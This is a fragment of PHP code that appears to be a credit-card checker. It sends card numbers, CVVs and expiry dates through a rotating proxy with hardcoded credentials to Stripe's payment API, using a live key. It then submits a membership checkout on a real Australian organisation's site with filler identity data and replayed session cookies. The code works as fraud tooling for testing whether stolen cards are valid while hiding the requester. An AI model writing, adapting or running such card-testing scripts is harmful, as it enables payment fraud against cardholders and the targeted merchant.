...
# -------------------- [WEBSHARE PROXY] -------------------#
$webshareuser = 'ksxftvcs-rotate';
$websharepass = 'sryuv7lh63g7';
$webshareport = 80;
...
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/api4/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api4/cookie.txt');

# ----------------- [1REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$firstname.'+'.$lastname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=aa34b207-7781-4d30-894f-2ef8557b1ad77a259c&muid=bb94b9ba-d2e6-4a49-9b4b-56fe414001903b062b&sid=d37ff564-b928-469d-a315-c7e4bf2a22d99e4c63&payment_user_agent=stripe.js%2F0663df7b8%3B+stripe-js-v3%2F0663df7b8&time_on_page=49935&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_196vLLISUV0oUaZa');
...
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://adss.org.au/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
...
'referer: https://adss.org.au/membership-account/membership-checkout/',
#: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'cookie: PHPSESSID=5ab5381aba991fcdc84613c23b1f8473',
'cookie: pmpro_visit=1',
'cookie: __stripe_mid=bb94b9ba-d2e6-4a49-9b4b-56fe414001903b062b',
'cookie: __stripe_sid=d37ff564-b928-469d-a315-c7e4bf2a22d99e4c63',
));

# ----------------- [2REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&donation=&username='.$firstname.''.$lastname.'&password='.$email.'&password2='.$email.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname='.$firstname.'&blastname='.$lastname.'&baddress1='.$zip.'+'.$firstname.'+'.$lastname.'&baddress2=&bcity=New+York&bstate=New+York&bzipcode='.$zip.'&bcountry=US&bphone='.$phone.'&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX1517&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
